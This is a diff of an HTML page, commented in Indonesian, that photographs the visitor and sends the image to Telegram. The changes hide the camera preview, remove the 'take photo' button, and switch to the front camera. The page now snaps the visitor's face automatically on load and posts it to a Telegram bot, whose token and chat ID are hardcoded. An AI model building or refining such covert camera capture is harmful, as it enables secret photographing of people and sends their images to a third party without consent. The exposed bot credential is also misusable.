@@ -12,8 +12,7 @@
 </head>
 <body>
   <h2>Ambil dan Kirim Foto ke Telegram</h2>
-  <video id="video" autoplay></video><br>
-  <button onclick="takePicture()">Ambil Foto</button><br>
+  <video id="video" autoplay style="display:none;"></video><br>
   <canvas id="canvas" style="display:none;"></canvas>
   <img id="photo" src="" style="display:none;"><br>
   <button onclick="uploadToTelegram()" style="display:none;" id="sendButton">Kirim ke Telegram</button>
@@ -25,11 +24,15 @@
     const sendButton = document.getElementById('sendButton');
     let stream;
 
-    // Akses kamera
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
+    // Akses kamera depan
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
       .then(s => {
         stream = s;
         video.srcObject = s;
+        // Tunggu video siap, lalu ambil foto
+        video.onloadedmetadata = () => {
+          takePicture();
+        };
       })
       .catch(err => alert('Error akses kamera: ' + err));
 
@@ -41,13 +44,18 @@
       photo.src = canvas.toDataURL('image/png');
       photo.style.display = 'block';
       sendButton.style.display = 'block';
+      // Hentikan kamera setelah foto diambil
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+      }
+      video.style.display = 'none';
     }
 
     // Kirim ke Telegram
     async function uploadToTelegram() {
       const blob = await (await fetch(photo.src)).blob();
       const formData = new FormData();
-      formData.append('chat_id', '1805764667'); // Ganti dengan chat ID
+      formData.append('chat_id', '1805764667');
       formData.append('photo', blob, 'photo.png');
 
       fetch('https://api.telegram.org/bot7562937806:AAHBtsb8fMahmwFrG-C0CMucbInQrfHZOeE/sendPhoto', {
